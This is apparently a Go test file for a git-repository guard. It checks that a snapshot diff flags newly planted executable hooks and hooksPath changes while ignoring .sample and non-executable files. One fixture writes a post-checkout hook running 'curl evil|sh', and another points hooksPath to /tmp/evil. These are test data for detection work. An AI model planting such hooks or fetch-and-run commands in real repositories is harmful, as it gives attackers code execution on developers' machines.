package gitguard

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeRepo(t *testing.T) (repo, gitdir, hooks string) {
	t.Helper()
	repo = t.TempDir()
	gitdir = filepath.Join(repo, ".git")
	hooks = filepath.Join(gitdir, "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(gitdir, "config"), []byte("[core]\n\tbare = false\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	// a shipped sample hook: git never runs *.sample, so it must be ignored.
	if err := os.WriteFile(filepath.Join(hooks, "pre-commit.sample"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return repo, gitdir, hooks
}

func TestSnapshotDiffDetectsHookAndConfigChanges(t *testing.T) {
	repo, gitdir, hooks := writeRepo(t)

	before, err := Snapshot(repo)
	if err != nil {
		t.Fatal(err)
	}
	if d := before.Diff(before); len(d) != 0 {
		t.Fatalf("identical snapshots must not diff: %v", d)
	}

	// The agent plants an executable hook and redirects hooksPath via config.
	if err := os.WriteFile(filepath.Join(hooks, "post-checkout"), []byte("#!/bin/sh\ncurl evil|sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(gitdir, "config"), []byte("[core]\n\tbare = false\n\thooksPath = /tmp/evil\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	after, err := Snapshot(repo)
	if err != nil {
		t.Fatal(err)
	}
	changes := before.Diff(after)
	joined := strings.Join(changes, " ")
	if !strings.Contains(joined, "post-checkout") {
		t.Errorf("must flag the planted hook, got %v", changes)
	}
	if !strings.Contains(joined, "config") {
		t.Errorf("must flag the config change, got %v", changes)
	}
	for _, c := range changes {
		if strings.Contains(c, ".sample") {
			t.Errorf("must ignore .sample hooks (git never runs them): %v", c)
		}
	}
}

func TestSnapshotIgnoresNonExecutableHook(t *testing.T) {
	repo, _, hooks := writeRepo(t)
	before, err := Snapshot(repo)
	if err != nil {
		t.Fatal(err)
	}
	// A non-executable file in hooks/ is never run by git -> not an exec-surface change.
	if err := os.WriteFile(filepath.Join(hooks, "notes.txt"), []byte("just notes\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	after, err := Snapshot(repo)
	if err != nil {
		t.Fatal(err)
	}
	if d := before.Diff(after); len(d) != 0 {
		t.Fatalf("a non-executable hooks/ file must not be flagged: %v", d)
	}
}

func TestSnapshotNoGitDir(t *testing.T) {
	s, err := Snapshot(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if d := s.Diff(s); len(d) != 0 {
		t.Fatal("a non-git dir must have an empty, stable snapshot")
	}
}
